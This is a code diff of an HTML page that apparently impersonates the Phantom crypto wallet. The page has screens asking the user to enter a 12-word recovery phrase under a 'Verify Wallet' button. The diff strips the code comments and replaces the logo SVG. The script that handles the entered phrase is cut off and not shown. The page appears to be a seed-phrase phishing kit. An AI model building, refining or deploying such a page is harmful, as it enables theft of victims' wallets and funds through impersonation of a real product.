@@ -27,7 +27,6 @@
             overflow: hidden;
         }
 
-        /* Top Header Navigation */
         header {
             display: flex;
             justify-content: space-between;
@@ -69,7 +68,6 @@
             background-color: rgba(0, 0, 0, 0.03);
         }
 
-        /* Main Modal Container with perimeter purple glow/tint */
         .main-wrapper {
             display: flex;
             justify-content: center;
@@ -92,7 +90,6 @@
             position: relative;
         }
 
-        /* Pagination Dots */
         .dots {
             display: flex;
             gap: 8px;
@@ -112,7 +109,6 @@
             height: 11px;
         }
 
-        /* Modal Titles */
         .modal-title {
             font-size: 21px;
             font-weight: 600;
@@ -129,7 +125,6 @@
             line-height: 1.4;
         }
 
-        /* Screen States */
         .screen-center {
             display: flex;
             flex-direction: column;
@@ -158,7 +153,6 @@
             display: none !important;
         }
 
-        /* Inputs Container Layout */
         .inputs-container {
             display: grid;
             grid-template-columns: repeat(3, 120px);
@@ -168,7 +162,6 @@
             margin-bottom: 14px;
         }
 
-        /* Input Group */
         .input-group {
             position: relative;
             background-color: #141417;
@@ -183,7 +176,6 @@
             transition: border-color 0.2s, box-shadow 0.2s;
         }
 
-        /* Focused input group outline state */
         .input-group:focus-within {
             border-color: #c5bfff;
             box-shadow: 0 0 0 1px #c5bfff;
@@ -210,7 +202,6 @@
             -webkit-user-select: none;
         }
 
-        /* Toggle Phrase Button */
         .toggle-phrase {
             color: #9c9cae;
             background: none;
@@ -227,7 +218,6 @@
             color: #b794f4;
         }
 
-        /* Action Buttons */
         .action-btn {
             width: 100%;
             background-color: #1c1c21;
@@ -256,13 +246,13 @@
 </head>
 <body>
 
-    <!-- Header -->
     <header>
         <button class="ghost-close" title="Phantom">
-            <svg class="phantom-logo" viewBox="0 0 80 64" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#000000" d="M 9,47 C 5,42 8,31 14,23 C 23,11 38,2 49,2 C 63,1 71,10 72,22 C 73,34 67,46 59,53 C 53,58 48,56 47,50 C 42,57 34,59 29,54 C 23,59 14,61 10,57 C 7,54 7,50 9,47 Z"/>
-                <ellipse cx="46" cy="24" rx="4" ry="5" fill="#d3cfff"/>
-                <ellipse cx="58" cy="24" rx="4" ry="5" fill="#d3cfff"/>
+            <svg class="phantom-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 136 136" width="42" height="34" role="img" aria-label="Ghost">
+                <rect width="136" height="136" fill="#e2e0fd"/>
+                <path fill="#000" d="M47.5 95.6C45.8 96.0 43.7 96.0 42.5 95.9C41.3 95.8 41.1 95.4 40.5 95.0C39.9 94.6 39.1 93.9 38.7 93.5C38.3 93.1 38.4 93.2 38.1 92.5C37.8 91.8 37.2 91.0 37.1 89.5C37.0 88.0 36.9 85.7 37.2 83.5C37.6 81.3 38.4 78.7 39.2 76.5C40.0 74.3 41.0 72.5 42.1 70.5C43.2 68.5 44.3 66.8 46.0 64.5C47.7 62.2 50.2 59.3 52.5 57.0C54.8 54.7 57.9 52.1 59.9 50.5C61.9 48.9 62.7 48.4 64.5 47.4C66.3 46.4 68.5 45.2 70.5 44.3C72.5 43.4 74.8 42.6 76.5 42.1C78.2 41.6 78.7 41.4 80.5 41.2C82.3 41.0 85.5 40.8 87.5 41.0C89.5 41.2 90.8 41.5 92.5 42.2C94.2 43.0 96.3 44.5 97.5 45.5C98.7 46.5 99.2 47.3 99.9 48.5C100.6 49.7 101.3 51.0 101.8 52.5C102.3 54.0 102.6 55.7 102.8 57.5C103.0 59.3 103.1 61.5 102.9 63.5C102.7 65.5 102.3 67.5 101.8 69.5C101.2 71.5 100.4 73.7 99.6 75.5C98.8 77.3 97.9 79.0 96.9 80.5C95.9 82.0 94.7 83.6 93.5 84.8C92.3 86.0 90.7 87.0 89.5 87.7C88.3 88.4 87.2 88.5 86.5 88.7C85.8 88.9 86.1 88.9 85.5 88.7C84.9 88.5 83.5 87.9 83.0 87.5C82.5 87.1 82.4 87.0 82.2 86.5C82.0 86.0 82.0 85.0 81.9 84.5C81.8 84.0 82.1 83.3 81.5 83.8C80.9 84.3 79.5 86.3 78.5 87.3C77.5 88.3 76.7 89.2 75.5 89.9C74.3 90.7 72.8 91.4 71.5 91.8C70.2 92.2 68.6 92.5 67.5 92.5C66.4 92.5 65.6 92.0 64.9 91.5C64.2 91.0 63.5 90.2 63.1 89.5C62.8 88.8 62.8 88.3 62.8 87.5C62.8 86.7 62.8 85.1 62.8 84.5C62.8 83.9 63.0 83.6 62.5 84.1C62.0 84.6 61.0 86.2 59.8 87.5C58.6 88.8 56.7 90.8 55.5 91.8C54.3 92.8 53.8 93.1 52.5 93.7C51.2 94.3 49.2 95.2 47.5 95.6Z"/>
+                <ellipse cx="79.5" cy="60.1" rx="3.6" ry="4.45" fill="#e2e0fd"/>
+                <ellipse cx="90.6" cy="60.1" rx="3.6" ry="4.45" fill="#e2e0fd"/>
             </svg>
         </button>
         <a href="https://phantom.com/help" target="_blank" class="help-link">
@@ -271,10 +261,8 @@
         </a>
     </header>
 
-    <!-- Main Section -->
     <div class="main-wrapper">
         <div class="modal">
-            <!-- Initial Welcome Screen -->
             <div class="screen-center" id="welcomeScreen">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -286,7 +274,6 @@
                 <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
             </div>
 
-            <!-- Recovery Phrase Input Screen -->
             <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -304,7 +291,6 @@
                 <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
             </div>
 
-            <!-- Loading / Verification Screen -->
             <div class="screen-center hidden" id="loadingScreen">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -318,7 +304,6 @@
         </div>
     </div>
 
-    <!-- Script Logic -->
     <script>
         let wordCount = 12;
         const welcomeScreen = document.getElementById('welcomeScreen');
